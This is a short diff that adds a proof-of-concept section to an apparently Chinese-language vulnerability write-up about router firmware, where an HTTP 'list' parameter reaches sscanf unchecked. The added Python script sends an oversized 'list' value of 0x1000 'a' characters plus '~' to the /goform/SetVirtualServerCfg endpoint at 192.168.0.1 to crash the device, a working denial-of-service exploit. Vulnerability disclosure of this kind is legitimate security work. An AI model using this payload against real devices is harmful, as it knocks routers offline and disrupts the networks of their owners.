@@ -24,4 +24,15 @@ v3直接来源于http数据包中的list参数，随后直接调用sscanf函数�
 
 # POC
 
-拒绝服务的poc
+拒绝服务的poc：
+
+```python
+import requests
+
+url = "http://192.168.0.1/goform/SetVirtualServerCfg"
+list_data = 'a'*0x1000 + '~'
+
+r = requests.post(url, data={'list': list_data})
+print(r.content)
+```
+
